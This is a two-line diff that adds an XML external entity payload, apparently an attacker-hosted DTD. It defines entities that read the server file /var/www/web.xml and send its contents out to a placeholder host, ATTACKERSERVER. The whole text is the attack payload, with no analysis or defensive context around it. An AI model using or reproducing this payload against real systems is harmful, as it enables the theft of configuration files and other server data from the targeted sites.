@@ -1,0 +1,2 @@
+<!ENTITY % d SYSTEM "file:///var/www/web.xml"> 
+<!ENTITY % c "<!ENTITY rrr SYSTEM 'http://ATTACKERSERVER/%d;'>">
